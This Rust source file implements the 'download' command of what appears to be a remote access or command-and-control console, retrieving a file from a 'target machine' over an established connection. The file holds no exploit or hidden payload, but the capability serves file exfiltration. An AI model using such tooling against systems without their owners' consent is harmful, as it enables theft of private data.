use std::env;
use std::path::{Path, PathBuf};

use colored::Colorize;

use crate::commands::{cmd_usage, Command, CommandHandler};
use crate::files::receive_file;
use crate::success;

pub struct CommandDownload;

impl Command for CommandDownload {
    fn name(&self) -> String {
        String::from("download")
    }

    fn description(&self) -> String {
        format!(
            "{} {} {}",
            self.name(),
            "<remote path> (<output path>)",
            "- Downloads a file from the target machine"
        )
    }

    fn execute(&self, handler: &CommandHandler, args: Vec<String>) -> Result<(), String> {
        if args.len() < 1 {
            cmd_usage(self);
            return Ok(());
        }
        let mut connections = handler.connections.lock().unwrap();
        match connections.send_message(format!("DOWNLOAD\n\r{}", args[0].to_string())) {
            Ok(res) => {
                if res.starts_with("OK") {
                    let mut lines = res.lines();
                    lines.next();
                    let next = lines.next().unwrap();
                    let size = next
                        .trim_matches(char::from(0))
                        .trim()
                        .parse::<u64>()
                        .unwrap();

                    success!("Downloading file ({} bytes)", size);
                    let remote_file = Path::new(&args[0]);
                    if args.len() >= 2 {
                        let mut pathbuf = PathBuf::from(&args[1]);
                        if pathbuf.is_dir() {
                            pathbuf.push(remote_file.file_name().unwrap());
                        }
                        receive_file(connections.get_stream().unwrap(), pathbuf.as_path(), size);
                    } else {
                        let mut pathbuf = env::current_dir().unwrap();
                        pathbuf.push(remote_file.file_name().unwrap());
                        receive_file(connections.get_stream().unwrap(), pathbuf.as_path(), size);
                    }

                    Ok(())
                } else {
                    Err(format!("Error while downloading file: {}", res))
                }
            }
            Err(e) => Err(e),
        }
    }

    fn alias(&self) -> String {
        String::from("dl")
    }
}
